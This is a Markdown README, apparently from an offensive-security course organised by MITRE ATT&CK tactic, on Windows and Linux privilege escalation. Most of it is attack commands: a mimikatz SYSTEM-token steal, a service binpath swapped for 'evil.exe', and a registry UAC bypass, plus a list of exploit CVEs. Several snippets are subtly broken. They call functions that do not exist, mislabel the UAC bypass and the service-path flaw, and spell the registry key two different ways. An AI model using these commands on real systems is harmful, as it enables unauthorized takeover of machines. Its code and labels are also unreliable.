# Phase 4: Privilege Escalation

## 🎯 Overview

Privilege Escalation techniques enable adversaries to gain higher-level permissions on systems. Essential for accessing protected resources and achieving operational objectives.

### MITRE ATT&CK: Privilege Escalation (TA0004)
**Coverage**: 13 techniques including exploitation, token manipulation, DLL hijacking, and abuse of legitimate credentials.

---

## Key Techniques

### 1. Exploitation for Privilege Escalation (T1068)
```bash
# Common Windows exploits
- MS16-032 (Secondary Logon)
- MS16-075 (Hot Potato)
- MS17-010 (EternalBlue)
- CVE-2020-0787 (bits.exe)
- CVE-2021-1675 (PrintNightmare)

# Linux exploits
- DirtyCOW (CVE-2016-5195)
- PwnKit (CVE-2021-4034)
- Sudo vulnerabilities
```

### 2. Access Token Manipulation (T1134)
```powershell
# Steal SYSTEM token
mimikatz.exe "privilege::debug" "token::elevate" "exit"

# Impersonate token
$proc = Get-Process lsass
[Win32.ProcessToken]::ImpersonateProcessToken($proc.Id)
```

### 3. DLL Hijacking (T1574.001)
```powershell
# Find vulnerable applications
Get-ChildItem "C:\Program Files\" -Recurse -Filter "*.exe" | ForEach-Object {
    $missing = Check-MissingDLLs $_.FullName
    if ($missing) { Write-Output $_ }
}
```

### 4. Windows Services (T1574.011)
```batch
# Unquoted service path
sc qc VulnerableService
sc config VulnerableService binpath= "C:\Temp\evil.exe"
sc start VulnerableService
```

### 5. UAC Bypass (T1548.002)
```powershell
# Event Viewer UAC bypass
New-Item -Path "HKCU:\Software\Classes\ms settings\shell\open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\mssettings\shell\open\command" -Name "(Default)" -Value "cmd.exe"
Start-Process eventvwr.exe
```

---

## Detection & Mitigation

**Detection**:
- Monitor for exploitation attempts
- Track token manipulation
- Audit service modifications

**Mitigation**:
- Regular patching
- Least privilege principle
- Application whitelisting

---

**Next**: [Phase 5: Defense Evasion →](../05-defense-evasion/README.md)
**Previous**: [← Phase 3: Execution](../03-execution-persistence/README.md)